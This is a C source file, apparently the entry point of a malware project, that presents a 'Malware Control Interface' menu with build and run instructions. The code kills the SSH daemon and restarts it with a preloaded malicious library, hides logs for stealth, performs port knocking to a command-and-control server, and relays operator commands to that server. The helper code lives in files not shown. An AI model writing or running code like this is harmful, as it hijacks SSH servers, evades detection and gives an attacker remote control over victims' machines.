 /*Entry point - Starts SSH with LD_PRELOAD, calls port knocking*/

/* compile the malware : make
   run the Malware Interface : ./malware
   clean up : make clean
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "connect.h"
#include "port_knocking.h"
#include "hide.h"

void show_menu();
void handle_choice(int choice);

int main() {
    int choice;

    while (1) {
        show_menu();
        printf("\nEnter your choice: ");
        scanf("%d", &choice);
        getchar();  //clear newline character from buffer

        handle_choice(choice);
        sleep(2);  //small delay
    }

    return 0;
}

// menu
void show_menu() {
    system("clear");
    printf("=====================================\n");
    printf("  üõ†  MALWARE CONTROL INTERFACE  üõ†\n");
    printf("=====================================\n");
    printf("1Ô∏è‚É£  Start Malware (Kill & Restart SSH with LD_PRELOAD)\n");
    printf("2Ô∏è‚É£  Hide Logs & Activate Stealth Mode\n");
    printf("3Ô∏è‚É£  Perform Port Knocking to C2\n");
    printf("4Ô∏è‚É£  Send Command to C2\n");
    printf("5Ô∏è‚É£  Exit\n");
    printf("=====================================\n");
}

//user choice
void handle_choice(int choice) {
    switch (choice) {
        case 1:
            printf("[+] Restarting SSH with LD_PRELOAD...\n");
            system("pkill -f /usr/sbin/sshd");
            sleep(2);
            system("LD_PRELOAD=./malware.so /usr/sbin/sshd -D &");
            break;

        case 2:
            printf("[+] Hiding logs & enabling stealth mode...\n");
            hide_logs();
            break;

        case 3:
            printf("[+] Performing port knocking to C2...\n");
            perform_port_knocking();
            break;

        case 4: {
            char command[256];
            printf("Enter command to send to C2: ");
            fgets(command, sizeof(command), stdin);
            command[strcspn(command, "\n")] = 0;  //remove newline character
            send_data_to_c2(command);
            break;
        }

        case 5:
            printf("[+] Exiting malware interface...\n");
            exit(0);

        default:
            printf("[-] Invalid choice! Try again.\n");
    }
}
